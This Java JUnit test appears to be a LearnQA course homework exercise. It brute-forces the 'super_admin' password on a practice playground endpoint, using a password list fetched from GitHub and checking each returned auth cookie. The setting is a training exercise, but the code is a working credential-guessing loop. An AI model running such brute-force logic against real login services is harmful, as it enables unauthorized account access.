import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.HashMap;
import java.util.Map;

public class BruteForceTest {

    @Test
    public void testBruteForce() {
        int count=1;
        for (int i=0; i<count; i++) {
            Response passwordList = RestAssured
                    .get("https://raw.githubusercontent.com/Pletmentsev/LearnQA_JavaAPI/main/src/test_data/allpassword.json")
                    .andReturn();

            String password = passwordList.jsonPath().getString("passwords[" + i + "]");

            if (password != null) { // condition for checking a case when right password is absent

                Map <String, String> data = new HashMap<>();
                data.put("login", "super_admin");
                data.put("password", password);

                Response getCookie = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

                String responseCookie = getCookie.getCookie("auth_cookie");

                Map<String, String> cookies = new HashMap<>();
                cookies.put("auth_cookie", responseCookie);
                Response sendWithCookie = RestAssured
                    .given()
                    .cookies(cookies)
                    .when()
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

                String authResult = sendWithCookie.asString();

                if (authResult.equals("You are authorized")) { // condition which find the first right password
                    System.out.println("Your password is: " + password);
                    System.out.println(authResult);
                }
                else {
                    count++;
                }
            }
            else {
                System.out.println("Your password not in the list");
            }
        }
    }
}
